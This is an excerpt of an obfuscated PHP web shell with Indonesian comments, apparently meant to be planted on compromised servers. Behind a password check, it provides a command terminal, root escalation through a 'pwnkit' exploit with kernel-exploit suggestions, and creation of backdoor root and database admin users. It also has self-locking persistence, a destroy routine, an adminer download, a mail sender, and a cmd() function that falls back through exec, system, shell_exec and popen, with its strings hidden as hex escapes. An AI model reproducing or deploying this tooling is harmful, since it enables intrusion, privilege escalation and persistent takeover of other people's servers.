...
if (!isset($_SESSION['authenticated'])) {
    $stored_hashed_password = '$2y$10$xOa5Ochdrza2Rb/.ezW1hu5N3ACBAUAn3OKGP2I6fA7jK.klI.suG'; // Use PASSWORD_DEFAULT hash u can use this site https://phppasswordhash.com/ for generate ur password >  Gunakan hash PASSWORD_DEFAULT Anda dapat menggunakan situs ini https://phppasswordhash.com/ untuk menghasilkan kata sandi Anda
...
<body>
    <div class="menu-header">
        <ul>
            ...
            <li><i class="fa-solid fa-server"></i>&nbsp;<?= $_SERVER["x53x45x52x56x45x52x5fx53x4fx46x54x57x41x52x45"]; ?></li>
            <li><i class="fa-solid fa-network-wired"></i>&nbsp;: <?= gethostbyname($_SERVER["x53x45x52x56x45x52x5fx41x44x44x52"]); ?> |&nbsp;: <?= $_SERVER["x52x45x4dx4fx54x45x5fx41x44x44x52"]; ?></li>
            ...
            <form action="" method="post" enctype='<?= "x6dx75x6cx74x69x70x61x72x74x2fx66x6fx72x6dx2dx64x61x74x61"; ?>'>
        ...
        <div class="terminal">
            <div class="terminal-container">
                ...
                <div class="terminal-body">
                    ...
                    <form action="" method="post">
                        <ul>
                            <li><input type="text" name="terminal-text" class="terminal-input box-shadow" placeholder="<?= $fungsi[9]() . "@" . $_SERVER["x53x45x52x56x45x52x5fx41x44x44x52"]; ?>" autofocus></li>
                ...
                <div class="terminal-body">
                    <textarea name="" disabled><?php if ($fungsi[3]('.mad-root') && $fungsi[3]('pwnkit')) {
                                                    ...
                                                    if ($r_text[0] == "uid=0(root)") {
                                                        ...
                                                        echo "This Device Is Not Vulnerablen";
                                                        echo cmd('cat /etc/os-release') . "n";
                                                        echo "Kernel Version : " . suggest_exploit() . "n";
                                                    }
                                                } else {
                                                    $fungsi[24]('.mad-root');
                                                } ?></textarea>
                    <form action="" method="post">
                        <ul>
                            <li><input type="text" name="root-terminal" class="terminal-input" placeholder="<?= "root" . "@" . $_SERVER["x53x45x52x56x45x52x5fx41x44x44x52"]; ?>" autofocus></li>
    ...
    if ($conn->query($sql) === TRUE && $conn->query($sqltakeuserid)) {
        ...
        if ($result->num_rows > 0) {
            ...
            if ($conn->query($sqlusermeta) === TRUE) {
                ...
                echo "Error: " . $sqlusermeta . "n" . $conn->error;
            }
        } else {
            echo "User tidak ditemukan.n";
        }
...
if (isset($_GET['lockshell'])) {
    $curFile = trim(basename($_SERVER["x53x43x52x49x50x54x5fx46x49x4cx45x4ex41x4dx45"]));
    $TmpNames = $fungsi[31]();
...
if (isset($_GET['destroy'])) {
    $DOC_ROOT = $_SERVER["x44x4fx43x55x4dx45x4ex54x5fx52x4fx4fx54"];
    $CurrentFile = trim(basename($_SERVER["x53x43x52x49x50x54x5fx46x49x4cx45x4ex41x4dx45"]));
...
if (isset($_GET['adminer'])) {
    $URL = "x68x74x74x70x73x3ax2fx2fx67x69x74x68x75x62x2ex63x6fx6dx2fx76x72x61x6ex61x2fx61x64x6dx69x6ex65x72x2fx72x65x6cx65x61x73x65x73x2fx64x6fx77x6ex6cx6fx61x64x2fx76x34x2ex38x2ex31x2fx61x64x6dx69x6ex65x72x2dx34x2ex38x2ex31x2ex70x68x70";
    ...
    if ($_POST['create_folder'] == true) {
        ...
        if (!$fungsi[3]('pwnkit')) {
            ...
            if ($r_text[0] == "uid=0(root)") {
                ...
                cmd('./pwnkit "useradd ' . $username . ' ; echo -e "' . $password . 'n' . $password . '" | passwd ' . $username . '"');
            } else {
...
';
        ...
        $headersMail = 'From: ' . $emailFrom . '' . "rn" .
            'Reply-To: ' . $emailFrom . '' . "rn" .
...
function cmd($in, $re = false)
{
    ...
    try {
        if ($re) $in = $in . " 2>&1";
        if (function_exists("x65x78x65x63")) {
            @$GLOBALS['fungsi'][16]($in, $out);
            $out = @join("n", $out);
        } elseif (function_exists("x70x61x73x73x74x68x72x75")) {
            ob_start();
            @$GLOBALS['fungsi'][17]($in);
            $out = ob_get_clean();
        } elseif (function_exists("x73x79x73x74x65x6d")) {
            ob_start();
            @$GLOBALS['fungsi'][18]($in);
            $out = ob_get_clean();
        } elseif (function_exists("x73x68x65x6cx6cx5fx65x78x65x63")) {
            $out = $GLOBALS['fungsi'][19]($in);
        } elseif (function_exists("x70x6fx70x65x6e") && function_exists("x70x63x6cx6fx73x65")) {
        ...
        } elseif (function_exists("x70x72x6fx63x5fx6fx70x65x6e")) {
            $pipes = array();
